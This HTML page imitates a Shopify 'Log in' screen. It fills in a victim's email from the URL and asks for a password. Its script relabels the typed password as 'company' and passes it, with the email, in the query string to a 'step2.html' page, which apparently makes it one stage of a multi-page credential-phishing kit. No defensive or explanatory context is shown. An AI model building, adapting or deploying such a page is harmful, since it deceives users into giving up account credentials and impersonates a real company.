    <meta name="description" content="Log in to your Shopify account.">

    <style>
        .login-wrap { max-width: 600px; margin: 0 auto; padding: 60px 20px 40px; }
        .login-card {
            background: #ffffff; border-radius: 16px; padding: 44px 40px 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35); color: #111111;
        }
        .login-card h1 {
            margin: 0 0 6px; font-size: 28px; font-weight: 700;
            letter-spacing: -0.02em; color: #111;
        }
        .login-card .subtitle {
            margin: 0 0 26px; font-size: 15px; color: #6b6b6b; font-weight: 400;
        }
        .email-chip {
            display: flex; align-items: center; justify-content: space-between;
            gap: 12px; padding: 14px 16px; background: #f4f4f5;
            border: 1px solid #e4e4e7; border-radius: 10px;
            margin-bottom: 22px; font-size: 15px;
        }
        .email-chip .chip-email {
            color: #1a1a1a; overflow: hidden; text-overflow: ellipsis;
            white-space: nowrap; flex: 1; min-width: 0;
        }
        .email-chip .chip-action {
            color: #2563eb; font-weight: 500; font-size: 14px;
            text-decoration: none; flex-shrink: 0;
        }
        .email-chip .chip-action:hover { text-decoration: underline; }
        .password-wrap { position: relative; margin-bottom: 10px; }
        .password-wrap input[type="password"],
        .password-wrap input[type="text"] { padding-right: 46px !important; }
        .password-wrap .toggle-pw {
            position: absolute; top: 50%; right: 12px; transform: translateY(-50%);
            background: transparent; border: none; cursor: pointer;
            color: #6b7280; font-size: 15px; padding: 4px; line-height: 1;
        }
        .password-wrap .toggle-pw:hover { color: #1a1a1a; }
        .forgot-link {
            display: inline-block; color: #2563eb; font-size: 14px;
            font-weight: 500; margin: 6px 0 26px; text-decoration: none;
        }
        .forgot-link:hover { text-decoration: underline; }
        .need-help {
            display: block; text-align: center; color: #f5f5f5;
            font-size: 14px; font-weight: 500; margin: 34px auto 0;
            text-decoration: none; width: fit-content;
        }
        .need-help:hover { text-decoration: underline; }
        .legal-inline {
            display: block; text-align: center; color: #8a8a8a;
            font-size: 13px; line-height: 1.6; margin-top: 38px;
            max-width: 560px; margin-left: auto; margin-right: auto;
        }
        .legal-inline a {
            color: #ffffff; text-decoration: underline; text-underline-offset: 2px;
        }
        .legal-inline a:hover { color: #d4d4d4; }
        @media (max-width: 520px) {
            .login-card { padding: 30px 22px; border-radius: 14px; }
            .login-card h1 { font-size: 24px; }
            .login-wrap { padding: 30px 14px 30px; }
        }
    </style>
</head>
<body>

    <main class="login-wrap">
        <section class="login-card">
            <h1>Log in</h1>
            <p class="subtitle">Continue to Shopify account</p>

            <div class="email-chip">
                <span class="chip-email" id="chip-email">user@example.com</span>
                <a href="./index.html" class="chip-action" id="change-email">Change email</a>
            </div>

            <form id="login-form" novalidate>
                <label class="lbl" for="password">Password</label>
                <div class="password-wrap">
                    <input type="password" id="password" name="password" autocomplete="current-password" required>
                    <button type="button" class="toggle-pw" id="toggle-pw" aria-label="Show password">
                        <i class="fa-regular fa-eye" id="toggle-pw-icon"></i>
                    </button>
                </div>
                <a href="#" class="forgot-link">Forgot password?</a>
                <p class="error" id="password-error" role="alert"></p>

                <button type="submit" class="btn" id="submit-btn">
                    <span class="btn-label">Log in</span>
                    <span class="spinner" aria-hidden="true"></span>
                </button>
            </form>
        </section>

        <a href="#" class="need-help">Need Help?</a>

        <p class="legal-inline">
            By continuing, you agree to the <a href="#">Terms</a> and <a href="#">Privacy Policy</a>,
            and to receive marketing emails from Shopify. Unsubscribe anytime.
        </p>
    </main>

    <script>
        // 1) Read email from URL (?email=...) → auto-fill the chip
        const params = new URLSearchParams(window.location.search);
        const emailFromUrl = params.get('email');
        const chipEmail = document.getElementById('chip-email');
        const changeEmailLink = document.getElementById('change-email');

        if (emailFromUrl) {
            chipEmail.textContent = emailFromUrl;
            changeEmailLink.href = './index.html?email=' + encodeURIComponent(emailFromUrl);
        }

        // 2) Toggle password visibility
        const toggleBtn = document.getElementById('toggle-pw');
        const pwInput = document.getElementById('password');
        const icon = document.getElementById('toggle-pw-icon');

        toggleBtn.addEventListener('click', () => {
            const isHidden = pwInput.type === 'password';
            pwInput.type = isHidden ? 'text' : 'password';
            icon.classList.toggle('fa-eye', !isHidden);
            icon.classList.toggle('fa-eye-slash', isHidden);
        });

        // 3) On submit → go to step2.html with email + company (from password field)
        document.getElementById('login-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const passwordInput = document.getElementById('password');
            const passwordError = document.getElementById('password-error');
            const company = passwordInput.value.trim();

            if (!company || company.length < 2) {
                passwordError.textContent = 'Please enter your company name.';
                return;
            }
            passwordError.textContent = '';

            const url = new URL('./step2.html', window.location.href);
            if (emailFromUrl) url.searchParams.set('email', emailFromUrl);
            url.searchParams.set('company', company);
            window.location.href = url.toString();
        });
    </script>
